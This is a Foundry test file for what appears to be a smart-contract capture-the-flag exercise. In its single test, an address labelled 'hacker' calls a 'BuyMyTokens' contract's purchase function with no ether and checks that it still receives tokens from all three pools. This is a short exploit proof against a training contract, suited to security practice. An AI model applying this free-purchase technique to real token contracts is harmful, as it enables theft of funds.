// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { BuyMyTokens } from "../src/5_BuyMyTokens.sol";
import "../mocks/marqToken.sol";


contract BuyMyTokensTest is Test {

    BuyMyTokens public target;
    address public tokenAddress1;
    address public tokenAddress2;
    address public tokenAddress3;
    MarqToken public token1;
    MarqToken public token2;
    MarqToken public token3;
    function setUp() public {
           token1 = new MarqToken();
        tokenAddress1 = address(token1);
        token2 = new MarqToken();
        tokenAddress2 = address(token2);
        token3 = new MarqToken();
        tokenAddress3 = address(token3);
        target = new BuyMyTokens(tokenAddress1, tokenAddress2, tokenAddress3);




        token1.mint(1000 ether);
        token1.transfer(address(target), 1000 ether);
        token2.mint(1000 ether);
        token2.transfer(address(target), 1000 ether);
        token3.mint(1000 ether);
        token3.transfer(address(target), 1000 ether);

        vm.deal(address(0xBAD), 1.2 ether);
    }


 
    function test_GetThisPassing_5() public {
        address hacker = address(0xBAD);
    
       
        vm.startPrank(hacker);
      uint256[] memory amount = new uint256[](3);
      amount[0] = 12 ;
      amount[1] = 6 ;
      amount [2] = 4 ;

    target.purchaseTokens{value: 0}(amount);
        vm.stopPrank();
 
      assertEq(token1.balanceOf(hacker), 12 ether);
  assertEq(token2.balanceOf(hacker), 6 ether);
 assertEq(token3.balanceOf(hacker), 4 ether);
    }

}


